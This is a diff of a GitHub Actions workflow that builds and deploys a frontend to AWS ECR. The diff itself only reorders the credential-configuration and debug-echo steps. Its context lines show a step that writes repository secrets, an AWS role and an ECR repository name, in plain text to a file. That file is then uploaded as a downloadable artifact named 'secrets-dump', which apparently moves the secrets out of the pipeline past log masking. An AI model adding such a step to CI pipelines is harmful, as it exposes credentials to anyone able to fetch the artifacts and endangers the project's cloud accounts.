@@ -46,29 +46,30 @@ jobs:
               echo "ECR_REPOSITORY_FRONTEND=${{ secrets.ECR_REPOSITORY_FRONTEND_TF_PROD }}" >> $GITHUB_ENV
               ;;
           esac
-      - name: Debug Echo
-        run: |
-          echo "AWS_REGION ${{ env.AWS_REGION}} "
-          echo "AWS_ROLE_TO_ASSUME ${{ env.AWS_ROLE_TO_ASSUME}} "
-          echo "ECR_REPOSITORY_FRONTEND ${{ env.ECR_REPOSITORY_FRONTEND}} "
-          aws sts get-caller-identity
       
       - name: Create debug file
         run: |
           echo "AWS_ROLE_TO_ASSUME=${{ secrets.AWS_ROLE_TO_ASSUME_TF_DEV }}" > secrets-debug.txt
           echo "ECR_REPOSITORY_FRONTEND=${{ secrets.ECR_REPOSITORY_FRONTEND_TF_DEV }}" >> secrets-debug.txt
-          
-      - name: Configure AWS credentials
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: ${{ env.AWS_ROLE_TO_ASSUME }}
-          aws-region: ${{ env.AWS_REGION }}
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
           name: secrets-dump
           path: secrets-debug.txt
+
+      - name: Configure AWS credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ env.AWS_ROLE_TO_ASSUME }}
+          aws-region: ${{ env.AWS_REGION }}
+      
+      - name: Debug Echo
+        run: |
+          echo "AWS_REGION ${{ env.AWS_REGION}} "
+          echo "AWS_ROLE_TO_ASSUME ${{ env.AWS_ROLE_TO_ASSUME}} "
+          echo "ECR_REPOSITORY_FRONTEND ${{ env.ECR_REPOSITORY_FRONTEND}} "
+          aws sts get-caller-identity
       
       - name: Log in to Amazon ECR
         id: login-ecr
